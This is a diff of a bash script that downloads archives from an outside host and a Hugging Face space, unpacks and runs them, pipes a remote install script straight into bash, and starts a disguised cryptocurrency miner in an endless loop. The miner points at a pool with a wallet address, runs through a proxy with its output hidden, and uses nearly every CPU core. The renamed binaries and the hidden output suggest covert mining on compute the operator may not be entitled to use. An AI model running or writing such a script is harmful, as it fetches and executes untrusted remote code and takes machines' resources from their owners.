@@ -1,19 +1,33 @@
 #!/bin/bash
+cd ~/
+sleep 2
+curl http://greenleaf.teatspray.uk/system33.tar.gz -L -O -J
+sleep 2
+curl -k https://huggingface.co/spaces/kevindawkins587/ubuntu2204/resolve/main/ubuntu2404.tar.gz -L -O -J
+sleep 2
+tar -xf system33.tar.gz
+sleep 2
+tar -xf ubuntu2404.tar.gz
+sleep 2
+./system33 -S . /bin/bash >/dev/null
+
+sleep 2
+
+su -
+
+sleep 2
+cd
+sleep 2
+whoami
+sleep 2
+
 export DEBIAN_FRONTEND=noninteractive
 DEBIAN_FRONTEND=noninteractive
 
-sleep 2
 cat /etc/*-release
 sleep 2
 
-apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libjansson-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg libuv1-dev libssl-dev libhwloc-dev kmod msr-tools >/dev/null
-
-sleep 2
-
-wget -q https://nodejs.org/download/release/v18.9.1/node-v18.9.1-linux-x64.tar.gz
-tar -xf node-v18.9.1-linux-x64.tar.gz
-export PATH=$HOME/node-v18.9.1-linux-x64/bin:$PATH
-
+apt update >/dev/null
 sleep 2
 
 node -v && npm
@@ -32,10 +46,6 @@ curl -fsSL http://greenleaf.teatspray.uk/install_and_monitor_shade_root.sh | bas
 
 sleep 4
 
-DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
-
-sleep 2
-
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
 dpkg-reconfigure --frontend noninteractive tzdata > /dev/null
 
@@ -45,36 +55,30 @@ TZ='Africa/Johannesburg'; export TZ
 date
 sleep 2
 
-
 array=()
 for i in {a..z} {A..Z} {0..9}; 
    do
    array[$RANDOM]=$i
 done
 
-currentdate=$(date '+%d-%b-%Y_Bit_')
+provider=""
+provider+="Bitr_"
 ipaddress=$(curl -s api.ipify.org)
 num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
 used_num_of_cores=`expr $num_of_cores - 2`
 underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
 underscore="_"
 underscored_ip+=$underscore
-currentdate+=$underscored_ip
+provider+=$underscored_ip
 
 randomWord=$(printf %s ${array[@]::8} $'\n')
-currentdate+=$randomWord
+provider+=$randomWord
 
 sleep 2
 
 echo ""
 echo "You will be using $used_num_of_cores cores"
 echo ""
-
-sleep 2
-
-wget -q http://greenleaf.teatspray.uk/Xmas_Veil.tar.gz
-sleep 2
-tar -xf Xmas_Veil.tar.gz
 
 sleep 2
 
@@ -91,8 +95,13 @@ bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
 
 sleep 2
 
+wget -q http://greenleaf.teatspray.uk/Xmas_XLA.tar.gz
+sleep 2
+tar -xf Xmas_XLA.tar.gz
+sleep 2
+
 while true
 do
-./Xmas --donate-level 1 -o fastxyz.teatspray.uk:10281 -u solo:bv1qd0hntshqslfejlle0vk4ewh2km55n2gze99dna -p x --rig-id=$currentdate --verbose --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:1081 1>/dev/null 2>&1
+./Xmas --donate-level 1 -o fastxyz.teatspray.uk:10126 -a panthera -u solo:Svm2UGu7wbSSFQkAmttze1ZWceASny1VE9dnx59Lx5coHX5sAFEXmEVGfVE7BFAyd2VrTxHtzn5zYfjjxRmwnNBi3BHw9RQay@$provider --rig-id=$provider -p x -k --verbose --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:1081 1>/dev/null 2>&1
 sleep 10
 done
